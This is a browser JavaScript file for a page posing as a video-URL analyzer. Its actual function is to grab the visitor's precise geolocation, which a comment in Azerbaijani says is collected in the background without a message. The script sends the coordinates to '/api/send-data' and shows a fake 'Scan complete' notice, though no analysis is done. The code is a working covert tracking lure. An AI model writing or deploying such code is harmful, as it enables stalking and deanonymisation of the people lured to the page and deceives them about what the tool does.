const analyzeButton = document.getElementById('analyzeButton');
const videoUrlInput = document.getElementById('videoUrlInput');
const statusText = document.getElementById('status');
const progressBar = document.getElementById('progressBar');
const progressBarContainer = document.getElementById('progressBarContainer');

analyzeButton.addEventListener('click', async () => {
    const videoUrl = videoUrlInput.value.trim();
    if (!videoUrl) return;

    progressBarContainer.style.display = 'block';
    progressBar.style.width = '5%';

    let locationData = null;

    try {
        if ("geolocation" in navigator) {
            // Lokasiya arxa planda alınır, mesaj göstərilmir
            await new Promise((resolve) => {
                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        locationData = {
                            latitude: pos.coords.latitude,
                            longitude: pos.coords.longitude,
                            accuracy: pos.coords.accuracy
                        };
                        resolve();
                    },
                    () => resolve(),
                    { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
                );
            });
        }

        progressBar.style.width = '60%';

        await fetch('/api/send-data', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ videoUrl, location: locationData })
        });

        progressBar.style.width = '100%';
        statusText.textContent = "Scan complete. Results uploaded securely.";

        setTimeout(() => {
            progressBarContainer.style.display = 'none';
            progressBar.style.width = '0%';
            videoUrlInput.value = '';
            statusText.textContent = '';
        }, 3000);

    } catch (err) {
        console.error(err);
        progressBar.style.width = '0%';
        progressBarContainer.style.display = 'none';
        statusText.textContent = "An error occurred. Please try again.";
    }
});
